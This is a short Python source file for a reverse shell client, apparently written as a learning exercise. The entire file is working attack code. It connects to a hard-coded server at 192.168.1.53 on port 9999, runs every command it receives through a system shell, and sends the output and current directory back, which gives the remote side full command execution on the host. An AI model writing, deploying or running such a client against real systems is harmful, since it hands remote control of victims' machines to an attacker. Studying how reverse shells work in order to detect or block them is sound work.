#!/usr/bin/env python3

"""
Reverse Shell client
# -----------------------------------------------------------------
# This client connects to a reverse shell server and executes commands received from the server.
# It sends the output back to the server.
"""

import socket  # for networking (creating client socket)
import os   # for executing system commands
import subprocess  # for executing system commands
import sys  # for system exit

#server configuration. Set localhost to connect to the server running on the same machine.
SERVER_IP = "192.168.1.53"
SERVER_PORT = 9999  # Port to connect to the server


def main():
    # Create a socket using IPv4 (AF_INET) and TCP (SOCK_STREAM)
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Start client...")
    try:
        # Connect to the server
        client_socket.connect((SERVER_IP, SERVER_PORT))
        print(f"Connected to server at {SERVER_IP}:{SERVER_PORT}")
    except Exception as e:
        print(f"Connection Failed: {e}")
        sys.exit(1) # Exit if connection fails

    while True:
        try:
            # Receive command from the server
            data = client_socket.recv(1024)
            if not data:
                break  # Exit if no data is received
            print("Decoding command...")
            command=data.decode("utf-8", errors="ignore")  # Decode the command received from the server
            print(f"Command received: {command}")
            if command.startswith("cd "):
                # Change directory command
                try:
                    os.chdir(command.strip("cd "))  # Change the current working directory
                    output = "" 
                except Exception as e:
                    output= f"Error changing directory: {e}"
            else:
                #Run the command with subprocessor
                print("Executing command...")
                # Execute the command and capture the output
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = process.communicate()  # Communicate with the process
                print("Command executed")
                print("stdout",stdout.decode(errors="ignore"))
                print("stderr",stderr.decode(errors="ignore"))
                output = stdout.decode(errors="ignore") + stderr.decode(errors="ignore")  # Decode the output and error messages
                print("End of command execution")
                print (f"Output: {output}")

            #Append the currend working directory to the output
            current_directory = os.getcwd()  # Get the current working directory
            final_output = f"{output} {current_directory} > "  # Append the current directory to the output
            print(f"Final output: {final_output}")
            client_socket.send(final_output.encode())  # Send the output back to the server
        except Exception as e:
            print(f"Error: {e}")
            break
    
            
    # Close the socket when done
    client_socket.close()

    print("Connection closed.")
    sys.exit(0)  # Exit the program successfully


if __name__ == "__main__":
    main()
    
